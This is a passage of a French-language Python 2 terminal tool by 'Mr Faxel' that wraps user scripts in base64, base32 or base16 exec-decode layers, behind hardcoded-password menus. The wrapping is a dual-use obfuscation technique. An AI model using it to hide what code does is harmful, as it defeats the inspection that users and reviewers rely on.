‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\n\033[38;5;214m‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê\033[1;97m‚ïê‚ïê‚ïê‚ïù    ‚ïö\033[1;32m‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë‚óè‡πë€©\033[1;97m€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè                                 """)
logo_charge =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[38;5;214m‚óè____ _  _ ____ __\033[1;97m__ ____ ____    _  _ \033[1;32m___ _ _    ____‚óè \n\033[38;5;214m‚óè|    |__| |__| |_\033[1;97m_/ | __ |___    |  | \033[1;32m |  | |    |___‚óè \n\033[38;5;214m‚óè|___ |  | |  | | \033[1;97m \ |__] |___    |__| \033[1;32m |  | |___ |___‚óè \n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\033[1;32m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè          """)
logo_word =("""\033[38;5;214m ‚ñà     ‚ñà‚ñë ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ  ‚ñà‚ñà‚ñì     \033[1;97m‚ñà‚ñà‚ñì  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì\n\033[38;5;214m‚ñì‚ñà‚ñë ‚ñà ‚ñë‚ñà‚ñë‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå‚ñì‚ñà‚ñà‚ñí    \033[1;97m‚ñì‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà    ‚ñí ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí\n\033[38;5;214m‚ñí‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñë‚ñà‚ñà   ‚ñà‚ñå‚ñí‚ñà‚ñà‚ñë    \033[1;97m‚ñí‚ñà‚ñà‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë\n\033[38;5;214m‚ñë‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñë‚ñì‚ñà‚ñÑ   ‚ñå‚ñí‚ñà‚ñà‚ñë    \033[1;97m‚ñë‚ñà‚ñà‚ñë  ‚ñí   ‚ñà‚ñà‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë \n\033[38;5;214m‚ñë‚ñë‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì ‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí\033[1;97m‚ñë‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí  ‚ñí‚ñà‚ñà‚ñí ‚ñë \n\033[1;92m‚ñë ‚ñì‚ñë‚ñí ‚ñí  ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë ‚ñí‚ñí‚ñì  ‚ñí ‚ñë ‚ñí‚ñë‚ñì  ‚ñë‚ñë\033[1;92m‚ñì  ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë  ‚ñí ‚ñë‚ñë   \n\033[1;92m  ‚ñí ‚ñë ‚ñë    ‚ñë ‚ñí ‚ñí‚ñë   ‚ñë‚ñí ‚ñë ‚ñí‚ñë ‚ñë ‚ñí  ‚ñí ‚ñë ‚ñë ‚ñí  ‚ñë ‚ñí\033[1;92m ‚ñë‚ñë ‚ñë‚ñí  ‚ñë ‚ñë    ‚ñë    \n\033[1;92m‚ñë   ‚ñë  ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë‚ñë   ‚ñë  ‚ñë ‚ñë  ‚ñë   ‚ñë ‚ñë    ‚ñí\033[1;92m ‚ñë‚ñë  ‚ñë  ‚ñë    ‚ñë      \n\033[1;92m    ‚ñë        ‚ñë ‚ñë     ‚ñë        ‚ñë        ‚ñë  ‚ñë ‚ñë        ‚ñë           \n\033[1;92m                            ‚ñë                                                                                                                                                           """)
logo_mars_base =("""\033[38;5;247m‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ \033[1;95m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñÄ\n\033[38;5;247m‚ñà‚ñë‚ñÄ‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ÄÉ‚ñÑ‚ñà‚ÄÉ \033[1;95m‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñà‚ÄÉ‚ñà‚ñà‚ñÑ """)
logo_zlib_base =("""\033[38;5;245m‚ñÄ‚ñà‚ÄÉ‚ñà‚ñë‚ñë‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ \033[1;95m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñÄ\n\033[38;5;245m‚ñà‚ñÑ‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ \033[1;95m‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñà‚ÄÉ‚ñà‚ñà‚ñÑ""")
logo_mise_jour =("""\033[1;92m  __  __ _                      _                  \n\033[1;92m |  \/  (_)                    (_)                 \n\033[1;92m | \  / |_ ___  ___    __ _     _  ___  _   _ _ __ \n\033[1;92m | |\/| | / __|/ _ \  / _` |   | |/ _ \| | | | '__|\n\033[1;92m | |  | | \__ \  __/ | (_| |   | | (_) | |_| | |   \n\033[1;92m |_|  |_|_|___/\___|  \__,_|   | |\___/ \__,_|_|   \n\033[1;91m                              _/ |                 \n\033[1;91m                             |__/                  """)
####################################################################################################
####################################################################################################
def verification_robot():
        cls()
        mael("\033[38;5;245mVeuillez patientez le temps de verification robotique?")
        mael(logo_verif_robot)
        mael("\033[38;5;247mTerminer\033[1;91m. \033[1;92mVerification reussie\033[1;97m,\033[38;5;245m vous etes bien humain\n")
        raw_input("\t\033[1;91m[\033[38;5;24mSuivant\033[1;91m]") 
	Identification()
####################################################################################################
def Identification():	
	cls()
	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
        mael("\033[1;31m[\033[1;37m**\033[1;31m] \033[1;96m Auteur \033[1;31m:[38;5;112m* \033[48;5;0;38;5;197mMr [38;5;128mFaxel[38;5;112m * \033[1;31m[\033[1;37m**\033[1;31m] [38;5;18m")
        mael("[38;5;214müá®üáÆ\033[1;97m is the person whom you can never judge.\033[1;92m üá®üáÆ")
	kouadio = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
	if kouadio =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mChamp obligatoire")
		time.sleep(1)
		Identification()
	else:
		cls()
                print (38 * '\x1b[1;97m\xe2\x95\x90')
                print ("\033[48;5;0;38;5;197m‚ïî‚ïóF‚ï¶‚ïî‚ïê‚ïó‚ïî‚ïó‚ïî‚ï¶FF‚ï¶‚ïî‚ïê‚ïó‚ïî‚ïó‚ïî‚ï¶F‚ï¶‚ïî‚ïê‚ïó\n[38;5;251m‚ï†‚ï©‚ïó‚ïë‚ïë‚ï£F‚ïë‚ïë‚ïë‚ïö‚ïó‚ïî‚ïù‚ïë‚ï£F‚ïë‚ïë‚ïë‚ïëF‚ïë‚ïë‚ï£F\n[38;5;110m‚ïö‚ïê‚ïù‚ï©‚ïö‚ïê‚ïù‚ïù‚ïö‚ïùF‚ïö‚ïùF‚ïö‚ïê‚ïù‚ïù‚ïö‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù[38;5;227m "+ kouadio )
                print ("\033[48;5;0;38;5;197mMr[38;5;241m[38;5;114m Faxel\033[1;37m vous dit d\'utiliser ce script √† bon escient! [38;5;227m" + kouadio )
                print (38 * '\x1b[1;97m\xe2\x95\x90')
                print("")
                mael("\033[1;92mInfo\033[1;91m :\033[1;97mLe cr√©dit pour ce code va √†[38;5;245m Mr [38;5;185mFaxel")
                mael("""\033[1;92mNote\033[1;91m :\033[1;97mVous pouvez recoder, Mais n'oubliez pas de mentionner l'auteur.	
\033[1;92mInspiration\033[1;91m :\033[1;97mProgressez chaque jour avec audace vers vos\nr√™ves, refusez les coups d'arr√™t et rien ne pourra vous arr√™ter!!!
\033[1;93m----------\033[1;91m#\033[1;97mL'AVENIR C'EST MAINTENANT\033[1;91m#\033[1;93m---------""")
                mael("\033[1;92mUne pens√©e\033[1;97m a\033[1;91m <[38;5;112mZachary\033[1;97m,[38;5;112mMec\033[1;97m,[38;5;112mMael\033[1;97m,[38;5;112mDosso\033[1;97m,[38;5;112mSeverin\033[1;97m,[38;5;112mAnge Akobe,[38;5;112mMiss\033[1;96m Syntiche\033[1;91m>") 
                raw_input("\n\033[1;91m[ [38;5;24mSuivant \033[1;91m]")
		Securiter()
####################################################################################################	
def Securiter():	
	cls()
	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
        Nu = "Faxel"
        mdp = "08127934"
        loop = 'true'
        while (loop == 'true'):
            Nomu = raw_input("\033[1;91m[\033[1;97m**\033[1;91m] \x1b[1;97mNom d'utilisateur de l'outil \x1b[1;91m¬ª¬ª¬ª¬ª [48;5;0;38;5;197m")
            if (Nomu == Nu):
    	        md = raw_input("\033[1;91m[\033[1;97m++\033[1;91m] \x1b[1;97mMot de passe de l'outil      \x1b[1;91m¬ª¬ª¬ª¬ª [38;5;245m")
                if (md == mdp):	
		    print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	            print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
		    load("\033[1;91m[\033[1;92m@\033[1;91m]\033[38;5;245m Server\033[38;5;214m Faxel \033[38;5;241m...")
                    print("\n\033[1;91m[\033[1;92m‚óè\033[1;91m] \033[1;97mConnect√© en tant que \033[1;96m"  +  Nomu) #Dev:Faxel
	            time.sleep(1)
                    loop = 'false'
		    menu()			
	        else:
                    print ("\n\033[1;91m[\033[1;93mx\033[1;91m] \033[1;93mMot de passe incorrect!")
                    os.system('xdg-open https://wa.me/22555709610')
	            Securiter()
            else:
                 print ("\n\033[1;91m[\033[1;93mx\033[1;91m] \033[1;95mNom d'utilisateur incorrect!")
                 os.system('xdg-open https://t.me/Faxelh')
		 Securiter()
####################################################################################################
################################ Securiter Menu decodage base ######################################
def faxel_securite():	
	cls()
	print(logo2)
	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
	mdp = "Mael"
        loop = 'true'
        while (loop == 'true'):
            mp = getpass('\033[1;97m‚ï†‚ïê\033[1;31m‚ñ∂[38;5;221m MOT DE PASSE    \033[1;31m: [38;5;214m')
            if (mp == mdp):
		 print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	         print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
                 load("\033[1;97mChargement\033[1;93m...")
	         loop = 'false'
		 menu_decode()	
	    else:
		 print ("\033[1;91m[\033[1;93m!\033[1;91m] \033[38;5;116m Mot de passe üÖ±Ô∏è‚ÑπÔ∏è‚ôç\033[1;91m!")
                 os.system('xdg-open https://t.me/Faxelh')
		 faxel_securite()
####################################################################################################
################################ Securiter Menu Erros Mx Fzxyl #####################################
def error_securite():	
	cls()
	print(logo3)
	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mFaxel[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
	mdp = "Faxel-Mael"
        loop = 'true'
        while (loop == 'true'):
            mp = getpass('\033[1;97m‚ï†‚ïê\033[1;31m‚ñ∂[38;5;221m MOT DE PASSE    \033[1;31m: [38;5;214m')
            if (mp == mdp):
		 print("[38;5;214müá®üáÆ\033[1;97m I'm the person whom you can never judge. \033[1;92m üá®üáÆ")
	         print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\033[1;97mConnexion a[38;5;245m Mr \033[48;5;0;38;5;197mMael[38;5;214m‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
                 load("\033[1;97mChargement\033[1;93m...")
	         loop = 'false'
		 menu_error_mz_fzxyl()	
	    else:
		 print ("\033[1;91m[\033[1;93m!\033[1;91m] \033[38;5;116m Mot de passe üÖ±Ô∏è‚ÑπÔ∏è‚ôç\033[1;91m!")
                 os.system('xdg-open https://t.me/Faxelh')
		 error_securite()
####################################################################################################  
####################################################################################################
def menu():
    cls()
    print(logo4)
    horaire()	
    print("\033[1;97m‚ïî"+31*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;121m Menu Bases        \033[1;97m        ‚ïë")  
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;214m Menu Bash + Wordliste \033[1;97m    ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;111m Menu Zlib + Marshal + Base\033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;116m Menu \033[38;5;214mFaxel\033[38;5;116m Cryp complexe \033[1;97m ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;241m Menu Clavier Sup Termux  \033[1;97m ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m6.\033[1;91m]\033[48;5;0;38;5;195m Menu Error0 Mz Fzxyl     \033[1;97m ‚ïë") 
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m7.\033[1;91m]\033[38;5;247m Menu Autres Scripts      \033[1;97m ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m8.\033[1;91m]\033[38;5;115m Menu Feliciter ou Signaler\033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu decodage des bases\033[1;97m   ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mQ.\033[1;91m]\033[38;5;124m Quitter \033[1;97m(\033[38;5;116mexit\033[1;97m)        \033[1;97m    ‚ïë")
    print("\033[1;97m‚ïö"+31*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")
    choix()
def choix():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[\033[1;93m!\033[1;91m]\033[1;95m Remplissez correctement ")
	menu()
    elif dmd =="1":
        menu_bases()
    elif dmd =="2":
        menu_bash_ou_wordliste()    
    elif dmd =="3":
        menu_mars_zlib_base()
    elif dmd =="4":
        menu_Faxel_cryptage()
    elif dmd =="5":
        Menu_clavier()
    elif dmd =="6":
        error_securite()
    elif dmd =="7":
        Menu_autres_scripts()
    elif dmd =="8":
        Menu_Feliciter_Signal()
    elif dmd =="m" or dmd =="M":
        faxel_securite()
    elif dmd =="0" or dmd =="q" or dmd =="Q" or dmd =="00":
        arret()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
	raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu()
####################################################################################################	
####################################################################################################
def menu_bases():
    cls()
    print(logo)
    horaire()
    print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;136m Cryptage base64   \033[1;97m       ‚ïë")  
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;214m Cryptage base32          \033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;117m Cryptage base16          \033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[48;5;0;38;5;195m Menu Base image   \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;111m Menu Encodage Texte      \033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu general           \033[1;97m  ‚ïë")
    print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")
    choix_base()	
def choix_base():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_bases()
    elif dmd =="1":
        base_64()
    elif dmd =="2":
        base_32()
    elif dmd =="3":
        base_16()
    elif dmd =="4":
        menu_base_image()
    elif dmd =="5":
        menu_encodage_texte()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bases()
####################################################################################################
def base_64():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_64 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_base_64,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b64encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b64decode('''"+encode+"'''))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()  
####################################################################################################		
def base_32():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_32 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_base_32,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b32encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write('#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b32decode("'+encode+'"))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()    
####################################################################################################		
def base_16():
	cls()  
        charge()
        cls()
        print(logo)
	script_base_16 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_base_16,'r').read()
	except IOError:
		print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		encode = b16encode(ouverture)
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport base64\nexec(base64.b16decode('"+encode+"'))")
		enregistrement.close()
		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu()
	except:
		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu()  
####################################################################################################
####################################################################################################		
def menu_base_image():
    cls()	
    print(logo)
    horaire()
    print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;214m Encodage base64 image\033[1;97m    ‚ïë")  
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[48;5;0;38;5;195m Decodage base64 image\033[1;97m    ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[48;5;0;38;5;197m Menu Precedent       \033[1;97m    ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu General         \033[1;97m    ‚ïë")
    print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")
    choix_base_image() 
def choix_base_image():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_base_image()
    elif dmd =="1":
        cod()
    elif dmd =="2":
        dec()
    elif dmd =="p" or dmd =="P":
        menu_bases()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_base_image()	
####################################################################################################		
def cod():
 try:
    cls()  
    charge()
    cls()
    print(logo)
    image = open('deer.gif', 'rb') 
    lecture_image = image.read() 
    image_64_encodage = base64.encodestring(lecture_image)
    load("\033[1;97mChargement\033[1;93m...")
    print (image_64_encodage)
    print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
    raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
    menu_base_image()
 except IOError:
